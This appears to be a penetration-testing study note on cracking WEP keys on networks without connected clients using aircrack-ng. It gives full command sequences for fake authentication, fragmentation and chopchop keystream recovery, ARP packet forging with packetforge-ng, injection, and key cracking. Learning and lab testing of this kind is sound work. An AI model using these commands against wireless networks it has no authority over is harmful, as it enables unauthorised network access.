# Clientless WEP attacks

Aircrack-ng has two attacks, the KoreK ChopChop (attack 4) and the Fragmentation attack (attack 5), that can be used to crack the WEP key of a wireless client with no associated clients

Both of these attacks are used to obtain a PRGA15 file from the wireless network. Bear in mind though that the PRGA is not the WEP key and cannot be used to decrypt packets. It can, however, be used to create new packets that can later be used for injection.


In order for this attack to work, there needs to be:

- some data packets coming from the AP (you can check this by looking at the data field in airodump-ng. 
- the AP needs to be using WEP Open authentication. 
- the source MAC used in the attack must be associated with the AP (either run a fake association or use the MAC of a connected client) 




## Usage fragmentation attack

Start the monitor interface 
Start an airodump-ng session to capture the AP and BSSID 
Conduct a fake authentication and make it reassociate with a timing of 6000


```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 6000 -e <ESSID> -b <AP MAC> -h <Your MAC> <interface>
```

Run the fragmentation attack 

```
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>
```

The following filters can be used with the fragmentation attack: 

```
Option      Param     Description
-b          bssid     MAC address of the access point
-d          dmac      MAC address of the destination
-s          smac      MAC address of the source
-m          len       minimum packet length
-n          len       maximum packet length
-u          type      frame control: type field
-v          subt      frame control: subtype field
-t          tods      frame control: ToDS bit
-f          fromds    frame control: FromDS bit
-w          iswep     frame control: WEP bit
```

The following replay options can be applied: 

```
Option     Param       Description
-k         IP          set destination IP in fragments. defaults to 255.255.255.255
-l         IP          set source IP in fragments. defaults to 255.255.255.255
```

## Usage packetforge-ng attack

Packetforge-ng is used to create encrypted packets that can later be used for injection. You can create various types of packets such as UDP and ICMP packets although it is most commonly used to create ARP requests for subsequent injection
In order to use, you must have a previously obtained PRGA file from the target WEP AP. The PRGA is used to encrypt the packet you created. 

```
packetforge-ng <mode> <options>
```

The options are 

```
Option      Param       Description
-p          fctrl       set frame control word (hex)
-a          bssid       AP MAC address
-c          dmac        destination MAC address
-h          smac        source MAC address
-j                      set FromDS bit
-o                      clear ToDS bit
-e                      disable WEP encryption
-k          <ip[:port]> set destination IP [port]
-l          <ip[:port]> set source IP [port]
-t          ttl         set Time to Live
-w          <file>      write packet to a file
```

The Source Options are: 

```
Option      Param       Description
-r          <file>      read packet from a raw file
-y          <file>      read PRGA from a file
```

The modes are: 

```
Option      Description
--arp       forge an ARP packet (-0)
--udp       forge a UDP packet (-1)
--icmp      forge an ICMP packet (-2)
--null      build a null packet (-3)
--custom    build a custom packet (-9)
```


### Create an ARP request packet 

```
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -k <Dest IP> -l <Source IP> -y <xor file> -w <output file>
```

-0: generate an ARP request packet
-a: the AP MAC address
-h: the source (usually yours) MAC address
-k: the destination IP i.e. in ARP, this is “Who has this IP”
-l: the source IP i.e. in ARP, this is “Tell this IP”
-y: the PRGA filename
-w: the filename to save the packet to

When selecting the source and destination IP addresses to use in your crafted packets, many (but not all) APs will respond properly if you enter 255.255.255.255 for both addresses. However, if you can make an educated guess about the IP addresses in use on the wireless network, you can enter a valid IP address as the source, for example 192.168.1.100 and for the destination address, choose one that would never be issued by the DHCP server such as 192.168.1.255. This can often increase your likelihood of success when you inject the packet later.


#### Check the packet 

Run tcpdump to have a quick check 

```
tcpdump -n -vvv -e -s0 -r arp-request
```

Decrypt the packet using airdecap-ng 

```
airdecap-ng -e <ESSID> -w <WEP key> <filename>
```

Use TCPdump again on the decrypted packet 

```
tcpdump -n -vvv -e -s0 -r arp-request-dec
```

## Usage injection of ARP packet 

```
aireplay-ng -2 -r <arp_request_file> <monitor interface>
```


## Usage KoreK ChopChop Attack 

Uses a different technique compared to the fragmentation attack to acquire the PRGA for attacking clientless networks. 

The KoreK chopchop attack, when successful, can decrypt a WEP data packet without knowing the WEP key and can even work against dynamic WEP.

```
aireplay-ng -4 -b <AP MAC> -h <Source MAC> <interface>
```

Where:
-4: the chopchop attack
-b: the AP MAC address
-h: the source (probably your) MAC address
<interface>: the monitor mode interface

### Create the ARP packet with packetforge-ng and check for validaty

```
packetforge-ng -0 -a $AP -h $MON -l 192.168.1.255 -k 192.168.1.255 -y <captured_chopchop_file>.xor -w arp-korek
airdecap-ng -e <ESSID> -w aabbccddee arp_korek
tcpdump -n -vvv -e -s0 -r arp-korek-dec
```

## Summary 

Place your wireless card into monitor mode on the channel number of the AP:
Start an Airodump-ng capture, filtering on the AP channel and BSSID, saving the capture:
Conduct a fake authentication attack against the AP:
Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):
Craft an ARP request packet using packetforge-ng:
Inject the packet into the network using attack 2, the interactive packet replay attack:
Crack the WEP key using Aircrack-ng:

```
airmon-ng start <interface> <AP channel>
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
aireplay-ng -2 -r <packet filename> <interface>
aircrack-ng <capture>
```

















